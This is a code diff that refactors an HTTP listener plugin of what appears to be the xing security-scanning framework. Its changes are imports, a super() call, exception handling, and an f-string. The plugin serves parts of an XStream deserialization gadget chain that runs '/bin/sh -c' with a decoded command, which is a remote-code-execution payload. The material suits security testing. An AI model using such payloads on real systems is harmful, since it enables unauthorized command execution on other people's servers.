@@ -1,5 +1,5 @@
 import base64
-from flask import *
+from flask import Flask, request, Response
 from xing.core import PluginType
 from xing.core.BasePlugin import BasePlugin
 from xing.conf import Conf
@@ -9,7 +9,7 @@ import json
 
 class Plugin(BasePlugin):
     def __init__(self):
-        super(Plugin, self).__init__()
+        super().__init__()
         self.plugin_type = PluginType.LISTENER
         self.app_name = 'HTTP API Server'
         self.vul_name = 'HTTP API Server'
@@ -59,7 +59,7 @@ class Plugin(BasePlugin):
                 xml = xml % payload
                 return Response(xml, mimetype='application/xml')
 
-            except:
+            except Exception:
                 return Response(status=500, response='Error processing request')
 
 
@@ -68,7 +68,7 @@ class Plugin(BasePlugin):
             try:
                 payload = base64.b64decode(payload).decode()
                 self.logger.debug('send payload with command: ' + payload)
-                xml = """<linked-hash-set>
+                xml = f"""<linked-hash-set>
   <jdk.nashorn.internal.objects.NativeString>
     <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
       <dataHandler>
@@ -82,7 +82,7 @@ class Plugin(BasePlugin):
                     <command>
                        <string>/bin/sh</string>
                        <string>-c</string>
-                       <string>%s</string>
+                       <string>{payload}</string>
                     </command>
                     <redirectErrorStream>false</redirectErrorStream>
                   </next>
@@ -106,10 +106,10 @@ class Plugin(BasePlugin):
       </dataHandler>
     </value>
   </jdk.nashorn.internal.objects.NativeString>
-</linked-hash-set>""" % payload
+</linked-hash-set>"""
                 return Response(xml, mimetype='application/xml')
 
-            except:
+            except Exception:
                 return Response(status=500, response='Error processing request')
 
         def run_query(cur, params):
